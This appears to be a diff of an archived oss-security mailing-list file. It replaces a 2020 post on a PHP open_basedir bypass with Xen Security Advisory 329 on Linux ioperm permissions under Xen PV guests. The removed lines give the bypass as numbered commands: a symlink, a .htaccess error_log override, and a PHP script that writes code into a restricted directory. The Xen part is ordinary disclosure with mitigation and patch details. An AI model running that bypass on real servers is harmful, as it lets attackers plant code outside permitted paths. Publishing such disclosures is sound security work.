@@ -1,32 +1,109 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/09/17/3
-Message-ID: <emhIOMW1by5zKGvn1A33fxs2tjH-uFZLnjxdvjNdtX3aXQdAZ_YCxKfPJmbE8pjC4RcrxLCicHjPGPElA6yT29oq-K09pqSZ7ebXukctKHM=@protonmail.com>
-Date: Thu, 17 Sep 2020 02:41:22 +0000
-From: Havijoori <havijoori@...tonmail.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: Apache + PHP <= 7.4.10 open_basedir bypass
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/07/21/2
+Message-Id: <E1jxq1y-0007MA-2r@xenbits.xenproject.org>
+Date: Tue, 21 Jul 2020 11:01:54 +0000
+From: Xen.org security team <security@....org>
+To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
+CC: Xen.org security team <security-team-members@....org>
+Subject: Xen Security Advisory 329 v3 (CVE-2020-15852) - Linux ioperm bitmap context switching issues
 Content-Type: text/plain; charset=utf-8
 
-Introduction
-============
-open_basedir security feature can be bypassed when Apache web server runs PHP scripts.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Proof of Concept
-================
-1. Set open_basedir as a security feature in php.ini file :
-   open_basedir = /var/www/html:/tmp
-2. Make a directory with the name of your web server's home directory inside your web server's home directory :
-   mkdir -p /var/www/html/var/www/html
-3. Make a symlink to a restricted writable directory inside this new directory :
-   ln -s /home/havijoori/www/uploads /var/www/html/var/www/html/test
-4. Make a .htaccess file in your web server's root directory to set php value :
-   php_value error_log "var/www/html/test/hacked.php"
-5. Make a PHP script, "bypass.php" in your web server's root directory to exploit the vulnerability :
-   <?php error_log("<?php phpinfo(); ?>"); ?>
-6. Call the script :
-   curl http://webserver/bypass.php
-7. After successful exploitation, our file "hacked.php" should be created in the restricted directory :
-   ls /home/havijoori/www/uploads/hacked.php
+            Xen Security Advisory CVE-2020-15852 / XSA-329
+                              version 3
 
-Tested with PHP 5.2.5 and 7.x.
-Similar to CVE-2007-3378.
+             Linux ioperm bitmap context switching issues
+
+UPDATES IN VERSION 3
+====================
+
+CVE assigned.
+
+ISSUE DESCRIPTION
+=================
+
+Linux 5.5 overhauled the internal state handling for the iopl() and ioperm()
+system calls.  Unfortunately, one aspect on context switch wasn't wired up
+correctly for the Xen PVOps case.
+
+IMPACT
+======
+
+IO port permissions don't get rescinded when context switching to an
+unprivileged task.  Therefore, all userspace can use the IO ports granted to
+the most recently scheduled task with IO port permissions.
+
+VULNERABLE SYSTEMS
+==================
+
+Only x86 guests are vulnerable.
+
+All versions of Linux from 5.5 are potentially vulnerable.
+
+Linux is only vulnerable when running as x86 PV guest.  Linux is not
+vulnerable when running as an x86 HVM/PVH guests.
+
+The vulnerability can only be exploited in domains which have been granted
+access to IO ports by Xen.  This is typically only the hardware domain, and
+guests configured with PCI Passthrough.
+
+MITIGATION
+==========
+
+Running only HVM/PVH guests avoids the vulnerability.
+
+CREDITS
+=======
+
+This issue was discovered by Andy Lutomirski.
+
+RESOLUTION
+==========
+
+Applying the appropriate attached patch resolves this issue.
+
+xsa329.patch           Linux 5.5 and later
+
+$ sha256sum xsa329*
+cdb5ac9bfd21192b5965e8ec0a1c4fcf12d0a94a962a8158cd27810e6aa362f0  xsa329.patch
+$
+
+DEPLOYMENT DURING EMBARGO
+=========================
+
+Deployment of the patches and/or mitigations described above (or
+others which are substantially similar) is permitted during the
+embargo, even on public-facing systems with untrusted guest users and
+administrators.
+
+But: Distribution of updated software is prohibited (except to other
+members of the predisclosure list).
+
+Predisclosure list members who wish to deploy significantly different
+patches and/or mitigations, please contact the Xen Project Security
+Team.
+
+
+(Note: this during-embargo deployment notice is retained in
+post-embargo publicly released Xen Project advisories, even though it
+is then no longer applicable.  This is to enable the community to have
+oversight of the Xen Project Security Team's decisionmaking.)
+
+For more information about permissible uses of embargoed information,
+consult the Xen Project community's agreed Security Policy:
+  http://www.xenproject.org/security-policy.html
+-----BEGIN PGP SIGNATURE-----
+
+iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAl8WytoMHHBncEB4ZW4u
+b3JnAAoJEIP+FMlX6CvZ4wsH/0/2AMv2kb/Q6rfwlNLSrnDbK2b6bb/QUE+0GcHO
+vrJ7Su53xrt7mllk/P4jYmtXfyUeJzfsahdb5GQVh4GBxOA3YGgS5T4pdpnwNoFi
+NFZV35qOT0muwpjE/zoefKsESuvqWjd28Vssm4HrllJ4YqcGik9clo6Y5qWMFcFH
+rlgchZinl5RtqAzMnuOdirWir7Xika6KdkXWi56CjKZBB5ozoqfH5JKi/XbWbwrz
+ZoFHXwKRuckuQSxUlvdpmI7MZDyggii3OhdvA6fIMDWq58EjSVVatrvDxYsGRL8x
+4PXmFPBp+871GjLQuQZ294fZH3DaZLWSrzvmwC8uZJr5uds=
+=Wdnv
+-----END PGP SIGNATURE-----
+
+Download attachment "xsa329.patch" of type "application/octet-stream" (5266 bytes)
